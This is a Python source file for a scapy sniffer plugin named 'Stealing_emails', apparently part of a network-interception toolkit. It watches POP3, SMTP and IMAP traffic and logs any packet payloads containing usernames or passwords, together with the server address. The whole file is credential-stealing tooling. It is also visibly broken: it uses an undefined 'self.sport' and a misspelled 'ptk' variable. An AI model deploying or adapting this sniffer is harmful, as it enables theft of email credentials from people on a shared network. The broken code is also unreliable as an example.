from scapy.all import *
from plugin import PSniffer

class Stealing_emails(PSniffer):
    ''' capture POP3,IMAP,SMTP '''
    _name          = 'email'
    _activated     = False
    _instance      = None

    @staticmethod
    def getInstance():
        if Stealing_emails._instance is None:
            Stealing_emails._instance = Stealing_emails()
        return Stealing_emails._instance
    def __init__(self):
        self.makeLogger()

    def filterPackets(self,pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
            self.dport = pkt[TCP].dport
            if self.dport == 110 or self.sport == 25 or self.dport == 143:
                if ptk[TCP].payload:
                    email_pkt = str(ptk[TCP].payload)
                    if 'user' in email_pkt.lower() or 'pass' in email_pkt.lower():
                        self.logging.info('[*] Server {}'.format(pkt[IP].dst))
                        self.logging.info('[*] {}'.format(pkt[TCP].payload))
